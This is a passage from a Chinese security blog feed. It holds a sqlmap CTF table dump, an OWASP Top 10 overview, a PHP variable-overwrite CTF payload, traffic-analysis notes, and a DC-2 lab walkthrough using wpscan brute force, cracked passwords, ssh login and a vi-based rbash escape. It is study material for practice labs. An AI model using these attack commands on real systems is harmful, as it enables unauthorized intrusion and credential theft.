src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304171541884.png" alt="image-20230417154011833"></p><p>爆表flag中的字段</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap-master\sqlmap-master&gt;python sqlmap<span class="hljs-selector-class">.py</span> -r C:\Users\lenovo\Desktop\<span class="hljs-number">4</span><span class="hljs-selector-class">.txt</span> -D <span class="hljs-string">&quot;ctf&quot;</span> -T <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">--columns</span>  <span class="hljs-attr">--batch</span> <span class="hljs-attr">--random-agent</span> -<span class="hljs-selector-tag">p</span> eid<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304171542146.png" alt="image-20230417154204076"></p><p>打印出来</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -r C:\Users\lenovo\Desktop\<span class="hljs-number">4</span><span class="hljs-selector-class">.txt</span> -D <span class="hljs-string">&quot;ctf&quot;</span> -T <span class="hljs-string">&quot;flag&quot;</span> -C <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">--dump</span>  <span class="hljs-attr">--batch</span> <span class="hljs-attr">--random-agent</span> -<span class="hljs-selector-tag">p</span> eid<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304171542492.png" alt="image-20230417154233424"></p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>owasp top10</title>
    <link href="/2023/02/22/owasp%20top%2010/"/>
    <url>/2023/02/22/owasp%20top%2010/</url>
    
    <content type="html"><![CDATA[<h1 id="owasp-top-10"><a href="#owasp-top-10" class="headerlink" title="owasp top 10"></a>owasp top 10</h1><h2 id="1-失效的访问控制"><a href="#1-失效的访问控制" class="headerlink" title="1:失效的访问控制"></a>1:失效的访问控制</h2><h6 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h6><p>访问控制是一种策略，用户超出其指定权限范围进行操作 </p><h6 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h6><p>一般通过改URL地址，内部程序状态，HTML页面 <em>，</em>可视化<em>工具cyber</em></p><h6 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h6><p>修改API请求方式绕过访问控制</p><p>重放或修改 JWT（JSON Web Token）   访问控制令牌  ，或操作cookie进行提权</p><p> 减少跨域资源共享   使用SSL对数据流进行加密，也可以对cookie进行加密  </p><h6 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h6><p>采用最小权限原则，或默认请求拒绝原则</p><p>优化访问控制体系</p><p>强制所有请求优先经过访问控制检查</p><h2 id="2-加密机制失效"><a href="#2-加密机制失效" class="headerlink" title="2.加密机制失效"></a>2.加密机制失效</h2><p>这里的重点在于经常暴露敏感数据的密码错误或缺少密码错误，如</p><h3 id="会话令牌"><a href="#会话令牌" class="headerlink" title="会话令牌"></a>会话令牌</h3><h3 id="登录-ID-和密码"><a href="#登录-ID-和密码" class="headerlink" title="登录 ID 和密码"></a>登录 ID 和密码</h3><h3 id="网上交易"><a href="#网上交易" class="headerlink" title="网上交易"></a>网上交易</h3><h3 id="个人信息（交换服务网络或SSN、健康记录等）"><a href="#个人信息（交换服务网络或SSN、健康记录等）" class="headerlink" title="个人信息（交换服务网络或SSN、健康记录等）"></a>个人信息（交换服务网络或SSN、健康记录等）</h3><p>应用程序可以使用自动数据库加密来安全地加密信用卡数据。不幸的是，当访问此信息时，它会立即未加密，从而导致 SQL 注入错误以明文形式提取信用卡信息，入侵者可能会利用这些信息  </p><h3 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h3><ul><li>使用具有延迟因子的稳健、加盐和自适应哈希算法来存储密码，例如 scrypt、Argon2、PBKDF2 或 bcrypt</li><li>传输敏感数据时应避免使用文件传输协议 (FTP)和简单邮件传输协议 (SMTP)等旧协议</li><li>建议实施经过身份验证的加密，而不是仅仅使用加密</li><li>必须生成加密随机密钥并将其存储为字节数组。如果使用密码，则必须使用基于密码的密钥创建算法将其更改为类似于密钥的东西</li></ul><h2 id="3-注入"><a href="#3-注入" class="headerlink" title="3.注入"></a>3.注入</h2><p>注入（或SQL 注入）是针对网站的数据库攻击，该网站使用结构化查询语言 (SQL) 来获取信息或执行通常需要经过身份验证的用户帐户的活动。程序很难从自己的代码中解释这些代码，从而允许攻击者进行注入攻击以访问受保护区域和伪装成受信任用户的敏感数据。<strong>注入包括SQL注入、命令注入、CRLF注入、LDAP注入等。</strong></p><p> 注入漏洞的根本原因，是当攻击者向应用程序发送恶意数据的时候，应用程序并未进行校验，直接传递给到解释器，解释器是不会对攻击者输入的恶意数据进行校验，而是直接翻译成机器可以执行的语句，于是乎攻击者的目的便达成了。常见的产生注入漏洞的原因如下：</p><p>常见的注入类型：</p><h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a><strong>CRLF注入</strong></h3><p>CRLF注入漏洞的本质和XSS有点相似，攻击者将恶意数据发送给易受攻击的Web应用程序，Web应用程序将恶意数据输出在HTTP响应头中。</p><h4 id="OS注入"><a href="#OS注入" class="headerlink" title="OS注入"></a>OS注入</h4><p>在应用程序获取用户输入的地方输入可执行的系统命令来获取服务器权限；</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>在应用程序已定义好的SQL语句后面通过某些特殊的符号增加额外的语句实现攻击；</p><h3 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h3><p>输入非SQL语句，如系统操作命令等来实现攻击的目的；</p><h3 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h3><p>（<strong>轻型目录访问协议</strong>（英文：Lightweight Directory Access Protocol，缩写：LDAP）。LDAP是一种<strong>通讯协议</strong>，LDAP支持TCP&#x2F;IP。可以说LDAP类似于mysql数据库，用来存储目录）</p><p>输入简单的LDAP语句来自动补全过滤器，以达到提权或绕过验证；</p><h3 id="XML解析器"><a href="#XML解析器" class="headerlink" title="XML解析器"></a>XML解析器</h3><p>通过DTD、XPath的方式，通过尝试访问内网文件的方式实现；</p><h3 id="SMTP包头注入"><a href="#SMTP包头注入" class="headerlink" title="SMTP包头注入"></a>SMTP包头注入</h3><p>邮件头注入，通过修改发包，加入CC（抄送人）等方式获取信息</p><h3 id="ORM查询注入"><a href="#ORM查询注入" class="headerlink" title="ORM查询注入"></a>ORM查询注入</h3><p>通过注入拼接过的sql代码进行注</p><h3 id="防御手段："><a href="#防御手段：" class="headerlink" title="防御手段："></a>防御手段：</h3><ul><li>一个更可取的替代方案是使用完全避开解释器、提供参数化 API 或易位到对象关系映射 (ORM) 工具的 API。</li><li>建议使用积极的服务器端验证输入。许多应用程序，包括用于移动应用程序的文本字段和 API，都需要特殊字符。</li><li>在查询中使用 <code>LIMIT</code> 和其他 SQL 约束是避免 SQL 注入情况下大量数据暴露的好方法。</li></ul><h2 id="4-不安全的设计"><a href="#4-不安全的设计" class="headerlink" title="4.不安全的设计"></a>4.不安全的设计</h2><p>这是 2021 年以来的一个全新类别，它涵盖了许多不同的安全问题，例如缺失或不充分的控制设计。为了解决这些问题，润色是一种专注于设计和架构缺陷的评估方法，它需要使用威胁建模、设计安全建议和参考架构等技术手段。需要注意的是，不安全的设计与不安全的实现是不同的概念。即使设计是安全的，实现上的缺陷也可能导致漏洞。而有缺陷的设计则无法通过完美的实现来弥补，因为这些缺陷可能需要特定的安全保护措施来防御特定的威胁。因此，在开发软件系统时，需要重视润色过程，以确保软件系统的安全性和可靠性。</p><h3 id="防御手段：-1"><a href="#防御手段：-1" class="headerlink" title="防御手段："></a>防御手段：</h3><p>1.开发过程中，应该对关键验证、访问控制、应用程序逻辑和基本流程进行威胁建模，以确保系统能够防范各种攻击。</p><p>2.在用户故事中包含安全术语和控制，以确保开发人员和业务人员都能够理解和遵守系统的安全要求。</p><p>3.所有层级的租户隔离设计也被视为一种实用的预防方法，可以有效地减少安全漏洞的风险。</p><p>4.在开发过程中，不断完善和优化系统的安全性和可靠性。</p><h2 id="5-安全配置错误"><a href="#5-安全配置错误" class="headerlink" title="5.安全配置错误"></a>5.安全配置错误</h2><p>一般的安全设置问题，都是由一些常见的设置问题导致的，例如配置错误的访问控制。这些问题会为攻击者提供快速和轻松地访问关键数据和站点区域的机会，从而导致重大安全风险。</p><h3 id="防御手段：-2"><a href="#防御手段：-2" class="headerlink" title="防御手段："></a>防御手段：</h3><p>限制访问权限：在Web应用程序中，只有授权的用户才能访问敏感数据或功能。为了避免出现未经授权的访问，可以使用强大的身份验证和授权机制来确保用户身份的真实性和合法性。例如，使用双因素认证、密码强度检查和会话管理等技术手段</p><h2 id="6-易受攻击和过时的组件"><a href="#6-易受攻击和过时的组件" class="headerlink" title="6.易受攻击和过时的组件"></a>6.易受攻击和过时的组件</h2><p>易受攻击和过时的组件是指应用程序中使用的第三方组件或库存在安全漏洞或已经过时，容易被攻击者利用，从而导致应用程序受到攻击。</p><h3 id="防御手段：-3"><a href="#防御手段：-3" class="headerlink" title="防御手段："></a>防御手段：</h3><p>定期更新组件：需要定期更新Web应用程序中使用的组件，以确保它们是最新的版本，并且包含最新的安全补丁</p><p>使用可靠的源：在选择组件时，需要使用可靠的源，例如官方网站或经过验证的第三方库。</p><p>删除任何过多的要求、功能、元素等</p><h2 id="7-身份识别和身份验证错误"><a href="#7-身份识别和身份验证错误" class="headerlink" title="7.身份识别和身份验证错误"></a>7.身份识别和身份验证错误</h2><p>之前称为无效的身份认证，此类别从第二名下滑，现在包含了与身份识别失效相关的CWE，当攻击者获取用户信息、密码恢复、ID 会话和其他登录凭据时，就会产生安全问题。顾名思义，身份和身份验证失败包括黑客利用此类漏洞利用身份验证不足。</p><p>防御手段：</p><ol><li><p>强化密码策略：应该要求用户创建强密码，并定期要求用户更改密码。同时，应该采用密码哈希和加盐等技术来保护用户密码。</p></li><li><p>实现多因素身份验证：多因素身份验证可以增加用户身份验证的安全性。例如，使用短信验证码、硬件令牌或生物识别技术等。</p></li><li><p>限制登录尝试次数：应该限制用户登录失败的次数，防止攻击者使用暴力破解密码的方式尝试登录。</p></li><li><p>使用HTTPS协议：使用HTTPS协议可以加密用户的登录凭据，防止敏感信息在传输过程中被窃取。</p></li></ol><h2 id="8-软件和数据完整性故障"><a href="#8-软件和数据完整性故障" class="headerlink" title="8.软件和数据完整性故障"></a>8.软件和数据完整性故障</h2><p>攻击者可以利用系统或应用程序的配置错误来进行数据篡改或破坏。重要数据和 CI&#x2F;CD 程序的完整性，而无需对其进行验证。一个例子是当应用程序使用来自内容交付网络 (CDN) 或未经授权的来源的扩展、模块或存储库时。未受保护的持续集成&#x2F;持续交付 ( CI&#x2F;CD ) 流程可能会增加恶意代码、系统受损或未经授权访问的风险</p><h3 id="防御手段：-4"><a href="#防御手段：-4" class="headerlink" title="防御手段："></a>防御手段：</h3><p>使用诸如数字签名之类的措施来确认数据或软件来自预期的来源而没有任何篡改</p><p>软件供应链的安全工具，用于保证组件不包含设计缺陷</p><h2 id="9-安全日志记录和监控失败"><a href="#9-安全日志记录和监控失败" class="headerlink" title="9.安全日志记录和监控失败"></a>9.安全日志记录和监控失败</h2><p>安全日志记录和监控是指在应用程序或系统中记录和监控安全事件和活动，以便及时检测和响应安全漏洞和攻击。安全日志记录和监控失败是指在记录和监控安全事件和活动时出现的问题和故障，导致未能及时检测和响应安全漏洞和攻击。</p><h3 id="防御手段：-5"><a href="#防御手段：-5" class="headerlink" title="防御手段："></a>防御手段：</h3><p>1.定期检查日志记录和监控系统：应该定期检查日志记录和监控系统的运行状态，确保其正常运行，并及时处理任何故障和问题</p><p>2.定期检查日志记录和监控系统：应该定期检查日志记录和监控系统的运行状态，确保其正常运行，并及时处理任何故障和问题</p><p>3.确保对日志数据进行适当编码，以避免对监控系统的入侵或网络威胁</p><h2 id="10-服务器端请求伪造（SSRF）"><a href="#10-服务器端请求伪造（SSRF）" class="headerlink" title="10.服务器端请求伪造（SSRF）"></a>10.服务器端请求伪造（SSRF）</h2><p>如果Web应用程序在获取远程资源时没有对用户提供的URL进行验证，就会存在SSRF漏洞。此漏洞会使攻击者能够强制应用程序向意外的目的地发送精心构造的请求，即使在有防火墙、VPN或其他网络访问控制列表保护的情况下也可能发生。</p><h3 id="防御手段：-6"><a href="#防御手段：-6" class="headerlink" title="防御手段："></a>防御手段：</h3><p>1.将远程资源访问功能分离到不同的网络中</p><p>2.使用反向代理：使用反向代理可以在应用程序和外部网络之间添加额外的安全层。反向代理可以拦截所有请求并过滤掉不安全的请求</p><p>3.使用白名单，只有在白名单中的资源和API才能被服务器访问</p>]]></content>
    
    
    <categories>
      
      <category>top10</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>到底给不给flag呢</title>
    <link href="/2023/02/10/%E5%88%B0%E5%BA%95%E7%BB%99%E4%B8%8D%E7%BB%99flag%E5%91%A2/"/>
    <url>/2023/02/10/%E5%88%B0%E5%BA%95%E7%BB%99%E4%B8%8D%E7%BB%99flag%E5%91%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="到底给不给flag呢"><a href="#到底给不给flag呢" class="headerlink" title="到底给不给flag呢"></a>到底给不给flag呢</h1><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;f73da0c8e7c774d488a6df0fec2890d9&#125;&#x27;</span>;<br><span class="hljs-variable">$qwq</span>= <span class="hljs-string">&#x27;我想要flag&#x27;</span>;<br><span class="hljs-variable">$QAQ</span> = <span class="hljs-string">&#x27;我又不想要flag了，滚吧&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$qwq</span>); <span class="hljs-comment">#</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span> || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123; <br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$QAQ</span>);<br>&#125;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<span class="hljs-comment">#foreach遍历</span><br>    <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$$value</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br><br><br>我想要flag<br></code></pre></td></tr></table></figure><p>发现有个flag，目测不可能是，去提交，回显错误。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;  <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$qwq</span>);&#125;<br></code></pre></td></tr></table></figure><p>如果get都没有传flag，就会退出输出$qwq 我想要flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span> || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123; <br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$QAQ</span>);<br></code></pre></td></tr></table></figure><p>如果post或者get传了flag&#x3D;flag，就会退出并输出$QAQ我又不想要flag了，滚吧</p><p>接着往下看，foreach和$$组合，妥妥的变量覆盖漏洞。</p><p>非常简单我们将flag的值覆盖掉即可；</p><p>payload：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">qwq</span>=flag&amp;flag=qwq<br></code></pre></td></tr></table></figure><p>$qwq&#x3D;$flag&amp;$flag&#x3D;$qwq</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111413974.png" alt="image-20230411141342734"></p><p>拿下flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>流量分析</title>
    <link href="/2022/06/06/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2022/06/06/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p>​</p><h2 id="1-日志分析"><a href="#1-日志分析" class="headerlink" title="1.日志分析"></a>1.日志分析</h2><p>日志文件扩展名“.log”，通常日志文件较大，审计时常常使用http Logs Viewer工具进行分析。</p><h2 id="2-流量分析"><a href="#2-流量分析" class="headerlink" title="2.流量分析"></a>2.流量分析</h2><p>真实环境中，除了日志分析就是流量分析，经常作为溯源，取证的重要手段。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033677.png" alt="img">五层协议</p><p><strong>数据链路层</strong>：</p><p>wireshark抓包是使用的链路层协议，直接获取的数据也就<em>是数据链路层的数据</em>帧</p><p>  常用过滤语法</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033029.png" alt="img">常用过滤语法</p><p>协议过滤</p><p>直接在抓包过滤框中直接输入协议名即可例如：</p><p>TCP，只显示TCP协议的数据包列表</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033600.png" alt="img">tcp</p><p>HTTP，只查看HTTP协议的数据包列表</p><p>Flags字段中SYN, FIN, ACK, PSH, RST, URG</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033499.png" alt="img"></p><p>SYN表示建立连接</p><p>FIN表示关闭连接</p><p>ACK表示响应</p><p>PSH表示有DATA数据传输</p><p>RST表示连接重置</p><h2 id="3-流量分析题的技巧"><a href="#3-流量分析题的技巧" class="headerlink" title="3.流量分析题的技巧"></a>3.流量分析题的技巧</h2><h3 id="1-审计应用"><a href="#1-审计应用" class="headerlink" title="1.审计应用"></a>1.审计应用</h3><p>（1）看到一个IP多个端口请求，或者多个IP的一个或多个相同端口请求，可以判断为端口扫描。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111034378.png" alt="img">扫描</p><p>（2）当过滤http时，看到大量SQL，可以判断为sql注入，当看到大量404 not fount，可以判断为目录扫描。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033789.png" alt="img">SQL注入</p><h2 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h2><p>1.直接搜索类</p><p>2.USB流量类</p><p>3.TLS加密类</p>]]></content>
    
    
    <categories>
      
      <category>流量分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-2靶场渗透</title>
    <link href="/2022/05/07/DC-2%E9%9D%B6%E5%9C%BA%E6%90%AD%E6%B8%97%E9%80%8F/"/>
    <url>/2022/05/07/DC-2%E9%9D%B6%E5%9C%BA%E6%90%AD%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-2靶场渗透"><a href="#DC-2靶场渗透" class="headerlink" title="DC-2靶场渗透"></a>DC-2靶场渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先用goby扫描，发现开放了80端口，</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071453438.png" alt="image-20230507145329743"></p><p>访问，收集到是用了wordpress4.7.10，并且发现flag1，提示到了cewl,（cewl工具生成字典），猜测应该是弱口令登录，一般wordpress后台登录界面为wp-login.php，顺手一试，发现果然存在登陆界面。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071454970.png" alt="image-20230507145435859"></p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071500664.png" alt="image-20230507150020602"></p><h2 id="进行爆破"><a href="#进行爆破" class="headerlink" title="进行爆破"></a>进行爆破</h2><h3 id="生成字典"><a href="#生成字典" class="headerlink" title="生成字典"></a>生成字典</h3><p>前面提示我们使用cewl进行生成字典，</p><p>sudo touch &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;dic1t.txt</p><p>sudo chmod 777 &#x2F;home&#x2F;kali&#x2F;桌面</p><p>sudo chmod 777 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;dic1t.txt</p><p>cewl <a href="http://dc-2/">http://dc-2/</a> -w &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;dic1t.txt</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071521302.png" alt="image-20230507152138228"></p><h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p>用工具 WPScan</p><p>WPScan 工具就是一个专门针对 WordPress 的安全漏洞和风险进行扫描和测试的工具，是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">wpscan --url dc-2 -e u<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071522177.png" alt="image-20230507152235097"></p><p>这里爆出来三个用户名，接着我们在桌面创建一个name.txt文件，放着这些用户名</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071524334.png" alt="image-20230507152428268"></p><h3 id="开始爆破"><a href="#开始爆破" class="headerlink" title="开始爆破"></a>开始爆破</h3><p>使用工具wpscan，用户名字典选择name.txt，密码字典选择cewl生成的字典dic1t.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">wpscan --url dc-2 -U /home/kali/桌面/name.txt -P /home/kali/桌面/dic1t.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071531786.png" alt="image-20230507153138713"></p><p>爆破出来jerry，tom的密码</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Username:</span> <span class="hljs-string">jerry,</span> <span class="hljs-attr">Password:</span> <span class="hljs-string">adipiscing</span><br><span class="hljs-attr">Username:</span> <span class="hljs-string">tom,</span> <span class="hljs-attr">Password:</span> <span class="hljs-string">parturient</span><br></code></pre></td></tr></table></figure><p>登陆上发现flag2，提示我们还有另一种入口。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071534569.png" alt="image-20230507153450500"></p><h2 id="系统渗透"><a href="#系统渗透" class="headerlink" title="系统渗透"></a>系统渗透</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>利用nmap对ip进行全面扫描，找下是否有其他端口。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">A</span> -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">192.168</span>.<span class="hljs-number">1.11</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071539383.png" alt="image-20230507153907325"></p><p>发现还存在7744端口 开放了ssh服务，可以利用爆出来的用户密码尝试连接。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">ssh 用户名<span class="hljs-meta">@主机地址</span> <span class="hljs-operator">-</span>p 端口<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">ssh jerry@192.168.1.11 -p 7744<br></code></pre></td></tr></table></figure><h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><p>我这里采用了xshell进行连接发现tom用户连接上了，测试whoami发现没有权限。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071547250.png" alt="image-20230507154759201"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>这里设计到了一个知识点<a href="https://blog.csdn.net/qq_43168364/article/details/111830233">rbash逃逸</a>。</p><p>我们先来看一下rbash限制后能进行那些操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cobol">echo $PATH<br>#查看上面得到path路径的所有文件<br>#运行结果 /home/tom/usr/bin<br>echo /home/tom/usr/bin/*<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071559875.png" alt="image-20230507155924835"></p><p>可以看见能用这四个命令，唯一有用的就只有vi（编辑器）这个命令，这里可以里用vi或者是BASH_CMDS设置shell来绕过rbash，然后再设置环境变量添加命令</p><p>首先进入vi</p><p>按Esc</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">输入:<span class="hljs-built_in">set</span> <span class="hljs-attribute">shell</span>=/bin/bash<br></code></pre></td></tr></table></figure><p>设置好shell并回车，接着输入 </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><h3 id="查看flag"><a href="#查看flag" class="headerlink" title="查看flag"></a>查看flag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> flag*<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071604167.png" alt="image-20230507160418055"></p><h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><p>提示我们jerry，那我们切换用户</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">su jerry</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071608088.png" alt="image-20230507160803050"></p><p>然后用命令找一下flag文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -name <span class="hljs-number">*f</span>lag*<br></code></pre></td></tr></table></figure><p>除了flag4.txt，其他文件的权限都没有，我们先看看flag4.txt</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071609909.png" alt="image-20230507160921843"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 